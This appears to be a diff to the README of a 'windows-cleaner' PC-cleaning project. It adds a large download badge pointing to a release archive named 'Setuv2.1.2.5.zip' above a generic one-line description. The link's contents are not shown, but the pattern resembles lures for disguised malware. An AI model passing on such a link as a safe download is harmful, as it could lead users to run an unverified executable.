@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/oliverwilson-19w8/windows-cleaner/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # windows-cleaner
 
 Windows-cleaner — PC Cleaner for Windows is designed to address common performance issues. It helps clean, optimize, and organize your PC.
